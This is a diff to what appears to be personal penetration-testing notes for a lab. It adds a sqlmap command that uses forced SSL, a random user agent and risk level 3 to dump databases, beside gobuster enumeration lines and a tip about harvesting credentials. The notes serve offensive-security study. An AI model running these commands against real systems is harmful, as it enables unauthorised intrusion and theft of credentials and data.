@@ -352,6 +352,7 @@ gobuster dir --url https://10.11.1.237/ --wordlist /usr/share/wordlists/dirb/com
 
 Burpsuite, copy entire POST request to file using burp function, then run: 
 sqlmap –r POSTfile.txt  (     if sucessful, run sqlmap -r POSTfile.txt --dump     ) (get creds or juicy info)
+sqlmap -r POSTfile.txt --force-ssl --random-agent --risk 3 --dump        (use with HTTPS with self-signed certs)
 
 
 gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
